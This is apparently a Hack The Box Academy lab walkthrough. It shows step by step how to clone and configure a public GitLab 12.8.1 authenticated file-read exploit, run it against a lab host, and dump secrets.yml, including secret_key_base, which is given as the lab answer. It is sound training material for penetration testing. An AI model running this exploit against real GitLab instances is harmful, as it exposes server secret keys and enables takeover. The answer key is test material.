Students will come to know that the running version of GitLab is `12.8.1`, which is vulnerable to arbitrary file read (authenticated), and they will have to utilize the following exploit [https://github.com/anjai94/gitlab-file-read-exploit](https://github.com/anjai94/gitlab-file-read-exploit).

![[HTB Solutions/Others/z. images/5abde9818a2843089dbed9d5c011c0d4_MD5.jpg]]

Students will have to clone the above exploit from the Github repository and change their current working directory to `gitlab-file-read-exploit/`.

Code: shell

```shell
git clone https://github.com/anjai94/gitlab-file-read-exploit
cd gitlab-file-read-exploit/
```

```
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-k3xbe99mhx]─[~]
└──╼ [★]$ git clone https://github.com/anjai94/gitlab-file-read-exploit
Cloning into 'gitlab-file-read-exploit'...
remote: Enumerating objects: 12, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (11/11), done.
remote: Total 12 (delta 1), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (12/12), 4.51 KiB | 4.51 MiB/s, done.
Resolving deltas: 100% (1/1), done.
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-k3xbe99mhx]─[~]
└──╼ [★]$ cd gitlab-file-read-exploit/
```

Subsequently, students will have to change the assigned values of `vapt` for the username to `student`, `Test@123` to `Password123!` for the password, and `localhost` to `gitlab-dev5.inlanefreight.local` for the URL address of the GitLab instance.

Code: shell

```shell
sed -i 's/vapt/student/g' exploitv3.py
sed -i 's/Test@123/Password123!/g' exploitv3.py
sed -i 's/localhost/gitlab-dev5.inlanefreight.local/g' exploitv3.py
```

```
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-k3xbe99mhx]─[~/gitlab-file-read-exploit]
└──╼ [★]$ sed -i 's/vapt/student/g' exploitv3.py

┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-k3xbe99mhx]─[~/gitlab-file-read-exploit]
└──╼ [★]$ sed -i 's/Test@123/Password123!/g' exploitv3.py

┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-k3xbe99mhx]─[~/gitlab-file-read-exploit]
└──╼ [★]$ sed -i 's/localhost/gitlab-dev5.inlanefreight.local/g' exploitv3.py
```

Right after they have made the changes in the `exploitv3.py` file, they will have to run it. Students will then be presented with information about the `secrets.yml` file and the value of the `secret_key_base` variable.

Code: shell

```shell
python3 exploitv3.py
```

```
─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-k3xbe99mhx]─[~/gitlab-file-read-exploit]
└──╼ [★]$ python3 exploitv3.py 
you are logedin
project Anshajanth1 was created.
project Anshajanth2 was created.
issue was created
issue was moved
Reading internal file....
# This file is managed by gitlab-ctl. Manual changes will be
# erased! To change the contents below, edit /etc/gitlab/gitlab.rb
# and run \`sudo gitlab-ctl reconfigure\`.

---
production:
  db_key_base: f3ceb67f5ba84ba84a0549e3c13f54167c6e0aaa0fec7a85b8f25c40e255cefebcd77f9710261737c29a401257f0e5f542686969be0aecd097b3f36a83650044
  secret_key_base: 6022f124545afbdac965cc8178712e00b2937c09c75999a8fd62cca428f65b2aff7a0ed0a885d7d2f44225f9e3f3347516a15bbf8fa4c93a77bcb0d9ea725945
  otp_key_base: 82b97a16073399a7b9e5e1a77a0977cca369cc503ee55ed6acbac80f3a094a5247c512523e5e8dd485aaef806324693c3ba78765f740b1c020f9ce57190b4161
<SNIP>
```

Answer: `6022f124545afbdac965cc8178712e00b2937c09c75999a8fd62cca428f65b2aff7a0ed0a885d7d2f44225f9e3f3347516a15bbf8fa4c93a77bcb0d9ea725945`